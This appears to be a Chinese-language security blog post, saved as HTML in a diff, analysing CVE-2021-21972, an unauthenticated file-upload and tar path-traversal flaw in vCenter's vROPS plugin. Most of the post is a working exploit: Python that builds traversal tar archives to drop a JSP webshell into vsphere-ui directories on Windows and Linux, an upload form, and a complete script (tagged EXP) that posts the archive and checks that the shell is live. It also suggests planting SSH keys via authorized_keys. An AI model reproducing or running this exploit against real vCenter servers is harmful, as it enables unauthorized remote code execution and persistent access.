@@ -1,0 +1,479 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/b6.png">
+  <link rel="icon" type="image/png" href="/img/b6.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Gr3yy">
+  <meta name="keywords" content="">
+  <title>CVE-2021-21972 - Gr3yy&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"gr3yyy123.github.io","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Gr3yy's B1og</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="CVE-2021-21972">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-02-25 17:03" pubdate>
+        February 25, 2021 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      962 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">CVE-2021-21972</h1>
+            
+            <div class="markdown-body">
+              <h1 id="CVE-2021-21972"><a href="#CVE-2021-21972" class="headerlink" title="CVE-2021-21972"></a>CVE-2021-21972</h1><p>vcenter server的 <code>vROPS</code> 插件存在未授权接口，其中 <code>uploadova</code> 接口允许上传ova模板文件，但是并未对文件进行类型判断</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-meta">@RequestMapping(</span><br><span class="hljs-meta">        value = &#123;&quot;/uploadova&quot;&#125;,</span><br><span class="hljs-meta">        method = &#123;RequestMethod.POST&#125;</span><br><span class="hljs-meta">    )</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">uploadOvaFile</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value = &quot;uploadFile&quot;,required = true)</span> CommonsMultipartFile uploadFile, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        logger.info(<span class="hljs-string">&quot;Entering uploadOvaFile api&quot;</span>);<br>        <span class="hljs-keyword">int</span> code = uploadFile.isEmpty() ? <span class="hljs-number">400</span> : <span class="hljs-number">200</span>;<br>        PrintWriter wr = <span class="hljs-keyword">null</span>;<br>...<br>        response.setStatus(code);<br>        String returnStatus = <span class="hljs-string">&quot;SUCCESS&quot;</span>;<br>        <span class="hljs-keyword">if</span> (!uploadFile.isEmpty()) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                logger.info(<span class="hljs-string">&quot;Downloading OVA file has been started&quot;</span>);<br>                logger.info(<span class="hljs-string">&quot;Size of the file received  : &quot;</span> + uploadFile.getSize());<br>                InputStream inputStream = uploadFile.getInputStream();<br>                File dir = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/tmp/unicorn_ova_dir&quot;</span>);<br>                <span class="hljs-keyword">if</span> (!dir.exists()) &#123;<br>                    dir.mkdirs();<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    String[] entries = dir.list();<br>                    String[] var9 = entries;<br>                    <span class="hljs-keyword">int</span> var10 = entries.length;<br><br>                    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> var11 = <span class="hljs-number">0</span>; var11 &lt; var10; ++var11) &#123;<br>                        String entry = var9[var11];<br>                        File currentFile = <span class="hljs-keyword">new</span> File(dir.getPath(), entry);<br>                        currentFile.delete();<br>                    &#125;<br><br>                    logger.info(<span class="hljs-string">&quot;Successfully cleaned : /tmp/unicorn_ova_dir&quot;</span>);<br>                &#125;<br><br>                TarArchiveInputStream in = <span class="hljs-keyword">new</span> TarArchiveInputStream(inputStream);<br>                TarArchiveEntry entry = in.getNextTarEntry();<br>                ArrayList result = <span class="hljs-keyword">new</span> ArrayList();<br></code></pre></td></tr></table></figure>
+<p>servlet直接匹配 <code>/uploadova</code> 接口，检查请求数据包含的 <code>uploadFile</code> 参数，上传成功返回’SUCCESS’，将临时文件置空并解包tar文件。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span>(entry != <span class="hljs-keyword">null</span>) &#123;<br>                  <span class="hljs-keyword">if</span> (entry.isDirectory()) &#123;<br>                      entry = in.getNextTarEntry();<br>                  &#125; <span class="hljs-keyword">else</span> &#123;<br>                      File curfile = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;/tmp/unicorn_ova_dir&quot;</span>, entry.getName());<br>                      File parent = curfile.getParentFile();<br>                      <span class="hljs-keyword">if</span> (!parent.exists()) &#123;<br>                          parent.mkdirs();<br></code></pre></td></tr></table></figure>
+<p>这里将分解的tar文件直接拼接在了 <code>/tmp/unicorn_ova_dir</code> 目录后面，若解压后的文件包含 <code>../</code> 则可造成目录穿越。</p>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>构造包含 <code>../</code> 的tar文件，通过未授权接口 <code>uploadova</code> 上传。</p>
+<ul>
+<li><strong><em>linux</em></strong>：内网机器可以直接构造 <code>../../home/vsphere-ui/.ssh/authorized_keys</code> 写入公钥</li>
+<li><strong><em>windows</em></strong>：写入webshell。</li>
+</ul>
+<h2 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h2><p>访问 <a target="_blank" rel="noopener" href="https://ip/ui/vropspluginui/rest/services/uploadova">https://ip/ui/vropspluginui/rest/services/uploadova</a> 返回405既证明漏洞存在。</p>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="构造含有回溯符的tar文件"><a href="#构造含有回溯符的tar文件" class="headerlink" title="构造含有回溯符的tar文件"></a>构造含有回溯符的tar文件</h3><p>可以利用python的 <code>tarfile</code> 库文件</p>
+<ul>
+<li><p><strong><em>windows</em></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br>tf = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.war&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>tf.add(<span class="hljs-string">&#x27;123.jsp&#x27;</span>,<span class="hljs-string">&#x27;..\\..\\ProgramData\\VMware\\vCenterServer\\runtime\\vsphere-ui\\server\\work\\deployer\s\\global\\40\\0\\h5ngc.war\\resources\\123.jsp&#x27;</span>)<br>tf.close()<br></code></pre></td></tr></table></figure></li>
+<li><p><strong><em>linux</em></strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> tarfile<br>tf = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;test.war&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>tf.add(<span class="hljs-string">&#x27;123.jsp&#x27;</span>,<span class="hljs-string">&#x27;../../usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/42/0/h5ngc.war/resources/123.jsp&#x27;</span>)<br>tf.close()<br></code></pre></td></tr></table></figure>
+<h3 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h3></li>
+</ul>
+<p>我测试的时候直接构造的html上传表单</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;vcenter_rce&quot;</span>&gt;</span><br>		<span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;https://xxx/ui/vropspluginui/rest/services/uploadova&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;MAX_FILE_SIZE&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;100000&quot;</span>&gt;</span><br>			Choose an image to upload:<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;uploadFile&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>			<span class="hljs-tag">&lt;<span class="hljs-name">br</span>&gt;</span><br>			<span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Upload&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Upload&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p>python也很方便，调用上传文件的接口即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> sys<br><br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br>url = sys.argv[<span class="hljs-number">1</span>]<br>files = &#123;<span class="hljs-string">&#x27;uploadFile&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload/Linux.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125; <br>url1 = url + <span class="hljs-string">&#x27;/ui/vropspluginui/rest/services/uploadova&#x27;</span><br>url2 = url + <span class="hljs-string">&#x27;/ui/resources/test1.jsp&#x27;</span><br><br><span class="hljs-keyword">try</span>:<br>    a = requests.post(url1,files=files,verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-keyword">if</span> a.status_code ==<span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;SUCCESS&#x27;</span> <span class="hljs-keyword">in</span> a.content:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] upload success&#x27;</span><br>        <span class="hljs-keyword">if</span> requests.get(url2,verify=<span class="hljs-literal">False</span>).status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] exploited&#x27;</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br></code></pre></td></tr></table></figure>
+<p><strong><em>webshell的地址只针对默认的vsac，并不通配，所以上传吼请求一下判断是否上传成功</em></strong></p>
+<h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> urllib3<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> tarfile<br><br>urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)<br><br>url = sys.argv[<span class="hljs-number">1</span>]<br>file_in = sys.argv[<span class="hljs-number">2</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">create_tar</span>(<span class="hljs-params">file_in</span>):</span><br>    <span class="hljs-comment"># windows_shell</span><br>    tf = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;win.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    tf.add(file_in,<span class="hljs-string">&#x27;..\\..\\ProgramData\\VMware\\vCenterServer\\runtime\\vsphere-ui\\server\\work\\deployer\s\\global\\40\\0\\h5ngc.war\\resources\\&#x27;</span>+file_in.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    tf.close()<br>    <span class="hljs-comment"># linux_shell</span><br>    tf1 = tarfile.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lin.tar&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>    tf1.add(file_in,<span class="hljs-string">&#x27;..\\..\\usr\\lib\\vmware-vsphere-ui\\server\\work\\deployer\\s\\global\\42\\0\\h5ngc.war\\resources\\&#x27;</span>+file_in.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>])<br>    tf1.close()<br>    <span class="hljs-keyword">return</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">uoloadova</span>(<span class="hljs-params">url,files</span>):</span><br>    url1 = url + <span class="hljs-string">&#x27;/ui/vropspluginui/rest/services/uploadova&#x27;</span><br>    url2 = url + <span class="hljs-string">&#x27;/ui/resources/test1.jsp&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        a = requests.post(url1,files=files,verify=<span class="hljs-literal">False</span>)<br>        <span class="hljs-keyword">if</span> a.status_code ==<span class="hljs-number">200</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;SUCCESS&#x27;</span> <span class="hljs-keyword">in</span> a.content:<br>            <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] tar upload success&#x27;</span><br>            <span class="hljs-keyword">if</span> requests.get(url2,verify=<span class="hljs-literal">False</span>).status_code == <span class="hljs-number">200</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><br><br>create_tar(file_in)<br>files1 = &#123;<span class="hljs-string">&#x27;uploadFile&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;lin.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125; <br>files2 = &#123;<span class="hljs-string">&#x27;uploadFile&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;win.tar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>)&#125;<br><span class="hljs-keyword">if</span> uoloadova(url,files1) == <span class="hljs-literal">True</span> <span class="hljs-keyword">or</span> uoloadova(url,files2) == <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] exploited&#x27;</span><br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[+] your file uploaded is : &#x27;</span>+ url + <span class="hljs-string">&#x27;/ui/resources/&#x27;</span>+file_in.split(<span class="hljs-string">&#x27;\\&#x27;</span>)[-<span class="hljs-number">1</span>]<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;[-] failed&#x27;</span><br><br>    <br></code></pre></td></tr></table></figure>
+
+
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/Web/">Web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Web/">Web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/EXP/">EXP</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/02/05/lan_fan_qie/">
+                        <span class="hidden-mobile">烂番茄提权</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
